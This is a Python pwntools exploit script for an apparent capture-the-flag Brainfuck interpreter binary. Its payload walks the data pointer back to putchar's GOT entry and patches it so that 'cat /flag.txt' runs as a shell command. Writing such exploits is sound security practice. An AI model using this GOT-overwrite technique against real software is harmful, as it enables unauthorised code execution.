#!/usr/bin/env python3
from pwn import *
import base64

# =========================================================
#                          SETUP                         
# =========================================================
exe = './bf_patched'
elf = context.binary = ELF(exe, checksec=True)
libc = '/lib/x86_64-linux-gnu/libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-l", "175"]
host, port = '', 1337

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg

breakrva 0x12d0
breakrva 0x143f

breakrva 0x12cf

# putchar
breakrva 0x1383

breakrva 0x1441

breakrva 0x127a

c
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
# $ pwn checksec bf 
#     Arch:       amd64-64-little
#     RELRO:      Partial RELRO
#     Stack:      No canary found
#     NX:         NX enabled
#     PIE:        PIE enabled
#     SHSTK:      Enabled
#     IBT:        Enabled
#     Stripped:   No

def bf_write_string(s: str) -> bytes:
    payload = []
    current_value = 0

    for c in s:
        target = ord(c)
        diff = target - current_value

        if diff > 0:
            payload.append('+' * diff)
        elif diff < 0:
            payload.append('-' * (-diff))

        payload.append('>')
        current_value = 0
    return ''.join(payload).encode()

def exploit():
    global io
    
    s = 'cat /flag.txt'
    
    payload = b'cat /flag.txt;#'
    payload += b'<'*(0x80) # move ptr to GOT of putchar
    
    # 0x31590
    payload += b'-'*0x90
    payload += b'>'
    payload += b'-'*0x15
    payload += b'>'
    payload += b'-'*0x3

    payload += b'<'*2

    payload += b'>'*0x10
    payload += b'-'*0x90

    with open("payload", "wb") as f:
        f.write(payload)
    
    io = initialize(argv=[payload])

    io.interactive()
    
if __name__ == '__main__':
    exploit()
